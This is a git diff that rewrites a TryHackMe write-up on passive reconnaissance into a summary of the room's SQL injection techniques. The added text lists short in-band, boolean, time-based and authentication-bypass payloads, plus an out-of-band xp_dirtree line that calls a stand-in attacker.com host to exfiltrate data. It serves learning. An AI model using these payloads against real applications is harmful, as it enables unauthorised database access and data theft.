@@ -1,90 +1,76 @@
-# Passive Reconnaissance (TryHackMe)
+# SQL Injection (TryHackMe)
 
-🔗 Room Link: [Passive Reconnaissance](https://tryhackme.com/room/passiverecon)  
-🧠 Difficulty: Easy  
-📁 Category: Information Gathering
+🔗 Room Name: SQL Injection  
+🧠 Difficulty: Medium  
+📁 Category: Web Exploitation
 
 ---
 
 ## 📝 Overview
 
-This room introduces **passive reconnaissance** techniques—methods of gathering information without directly interacting with the target. It covers tools and services that help gather public information using Open Source Intelligence (OSINT).
+This room provides a comprehensive introduction to different types of **SQL injection (SQLi)** attacks. It explores both in-band and blind SQLi techniques, teaching how to extract sensitive data from vulnerable web applications.
 
 ---
 
-## 🛠️ Tools & Resources Used
+## 🛠️ Tools & Techniques Used
 
-- Google Search Operators
-- WHOIS Lookup
-- NSLookup / Dig
-- Shodan
-- Certificate Transparency Logs (crt.sh)
-- Wayback Machine (archive.org)
-- Hunter.io
-- Social media and blog searches
+- In-Band SQL Injection  
+- Blind SQL Injection – Authentication Bypass  
+- Blind SQL Injection – Boolean-Based  
+- Blind SQL Injection – Time-Based  
+- Out-of-Band (OOB) SQL Injection
 
 ---
 
 ## 🧪 Learning Objectives
 
-- Understand the difference between active and passive recon
-- Discover domains, subdomains, and services using OSINT
-- Explore email harvesting and DNS record gathering
-- Learn about online footprint tracing
+- Understand how SQL queries can be manipulated through input fields  
+- Perform authentication bypasses via SQL injection  
+- Enumerate databases, tables, and columns using different SQLi techniques  
+- Identify blind SQL injection vulnerabilities using logic and timing  
+- Grasp the concept of out-of-band data exfiltration in rare SQLi scenarios
 
 ---
 
-## 🔍 Key Techniques Practiced
+## 🔍 Key Techniques Practised
 
-### ✅ WHOIS Lookup
+### ✅ In-Band SQL Injection
 
-Used to identify domain ownership and registration data:
+Basic injection using error messages or output display:
 
-```bash
-whois example.com
-```
+```sql
+' OR '1'='1
+' UNION SELECT null, version()--
 
-### ✅ DNS Record Discovery
+✅ Blind SQLi – Authentication Bypass
+Bypass login using conditional logic:
+' OR 1=1--
 
-Queried A, MX, TXT, and NS records:
+✅ Blind SQLi – Boolean-Based
+Infer true/false conditions by observing response behaviour:
+' AND 1=1--     -- True
+' AND 1=2--     -- False
 
-```bash
-nslookup -type=mx example.com
-```
+✅ Blind SQLi – Time-Based
+Use SQL sleep/delay functions to infer data:
 
-or
+' OR IF(1=1, SLEEP(5), 0)--
 
-```bash
-dig example.com ANY
-```
+✅ Out-of-Band SQLi
+Trigger DNS or HTTP-based interactions for data exfiltration (less common):
+'; EXEC xp_dirtree('//attacker.com/share')--
 
-### ✅ Shodan
+🎯 Key Takeaways
+SQL injection remains a critical web vulnerability and is often easy to test for.
 
-Found open services exposed on the internet:
+Blind SQLi requires creative logic and careful analysis of the application’s behaviour.
 
-- Search: `org:"CompanyName"` or `ip:targetIP`
+Out-of-band techniques are powerful but rely on specific database configurations and network conditions.
 
-### ✅ Certificate Search
+Input validation and parameterised queries are essential for preventing SQLi.
 
-Found subdomains using:
+⚠️ Ethical Notice
+This write-up is for educational purposes only. It respects the rules of TryHackMe and does not reveal solutions or flags.
 
-- [crt.sh](https://crt.sh)
-- [Censys](https://censys.io)
 
-### ✅ Wayback Machine
 
-Used to discover archived pages of a target website and exposed endpoints or technologies.
-
----
-
-## 🎯 Key Takeaways
-
-- Passive reconnaissance is legal and stealthy, useful for the first phase of a penetration test.
-- Publicly available information can often reveal sensitive data, such as subdomains, email addresses, and even software versions.
-- Tools like Shodan and crt.sh are powerful for mapping an organization’s external footprint.
-
----
-
-## ⚠️ Ethical Notice
-
-This writeup is for educational purposes only. No flags or answers are revealed in compliance with TryHackMe’s [Terms of Use](https://tryhackme.com/terms).
